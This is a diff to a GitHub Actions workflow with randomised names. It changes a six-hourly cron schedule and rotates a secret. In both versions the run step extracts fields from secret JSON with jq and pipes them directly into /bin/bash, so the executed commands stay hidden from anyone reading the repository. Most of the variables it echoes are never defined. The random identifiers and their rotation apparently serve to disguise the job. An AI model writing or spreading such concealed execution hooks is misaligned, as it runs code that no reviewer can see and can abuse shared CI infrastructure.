@@ -2,7 +2,7 @@ name: shiximian1894
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
+    - cron: '26 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: shiximian1894
         env:
-          vwf0430: ${{ secrets.vwf0430 }}
+          ncu9097: ${{ secrets.ncu9097 }}
         run: |
-          echo $vwf0430 | jq -r .ohdog85 | /bin/bash
-          echo $mw38 | jq -r .ejslk4 | /bin/bash
-          echo $uj188 | jq -r .xpihf62833 | /bin/bash
-          echo $wstp69416 | jq -r .nw07068 | /bin/bash
-          echo $vz114 | jq -r .dicgp090 | /bin/bash
-          echo $lux9042 | jq -r .n1 | /bin/bash
-          echo $wi9 | jq -r .ufxlz722 | /bin/bash
-          echo $m15952 | jq -r .zjk338 | /bin/bash
+          echo $ncu9097 | jq -r .nr47095 | /bin/bash
+          echo $deb5 | jq -r .bzav85963 | /bin/bash
+          echo $j9884 | jq -r .vcnf9 | /bin/bash
+          echo $montg51727 | jq -r .cnf86 | /bin/bash
+          echo $vbfg77358 | jq -r .pecuh9 | /bin/bash
+          echo $j24757 | jq -r .ownw94 | /bin/bash
 
